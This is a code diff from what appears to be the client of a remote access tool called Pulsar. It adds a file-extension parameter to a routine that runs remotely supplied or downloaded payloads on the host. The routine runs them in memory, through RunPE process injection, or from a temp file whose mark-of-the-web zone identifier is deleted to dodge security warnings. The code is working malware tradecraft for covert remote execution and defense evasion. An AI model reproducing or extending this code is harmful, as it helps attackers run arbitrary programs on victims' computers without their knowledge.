@@ -130,7 +130,7 @@ namespace Pulsar.Client.Messages
             else
             {
                 // execute from byte array (already in memory) or from file path
-                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath);
+                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
             }
         }
 
@@ -144,12 +144,12 @@ namespace Pulsar.Client.Messages
             }
 
             // Execute directly from downloaded bytes (never touches disk)
-            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath);
+            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
         }
 
-        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory = false, bool useRunPE = false, string runPETarget = null, string runPECustomPath = null)
+        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory = false, bool useRunPE = false, string runPETarget = null, string runPECustomPath = null, string fileExtension = null)
         {
-            Debug.WriteLine($"ExecuteProcess called: filePath={filePath}, fileBytes={(fileBytes != null ? fileBytes.Length : 0)} bytes, isUpdate={isUpdate}, executeInMemory={executeInMemory}, useRunPE={useRunPE}, runPETarget={runPETarget}");
+            Debug.WriteLine($"ExecuteProcess called: filePath={filePath}, fileBytes={(fileBytes != null ? fileBytes.Length : 0)} bytes, isUpdate={isUpdate}, executeInMemory={executeInMemory}, useRunPE={useRunPE}, runPETarget={runPETarget}, fileExtension={fileExtension}");
             
             // If we have a file path but no bytes, read the file
             if (fileBytes == null && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
@@ -248,7 +248,7 @@ namespace Pulsar.Client.Messages
                     {
                         Debug.WriteLine("Executing via normal process start...");
                         // For normal execution, we have to write to temp file (Windows requirement)
-                        string tempPath = FileHelper.GetTempFilePath(".exe");
+                        string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
                         File.WriteAllBytes(tempPath, fileBytes);
                         FileHelper.DeleteZoneIdentifier(tempPath);
                         
